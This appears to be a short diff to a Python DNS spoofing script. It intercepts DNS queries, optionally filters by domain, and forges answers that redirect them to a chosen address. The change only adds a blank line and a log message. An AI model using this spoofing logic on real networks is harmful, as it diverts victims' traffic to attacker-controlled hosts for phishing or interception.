@@ -11,6 +11,7 @@ def parse(packet):
     if not pkt.haslayer(DNSQR):
         packet.accept()
         return
+
     if(args.domain is not None):
         if(args.domain not in pkt[DNS].qd.qname):
             packet.accept()
@@ -20,6 +21,7 @@ def parse(packet):
             UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
             DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
             an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=args.redirect)))
+    print("Redirecting {} to {}".format(pkt[DNS].qd.qname, args.redirect))
     packet.set_payload(str(spkt))
     packet.accept()
 
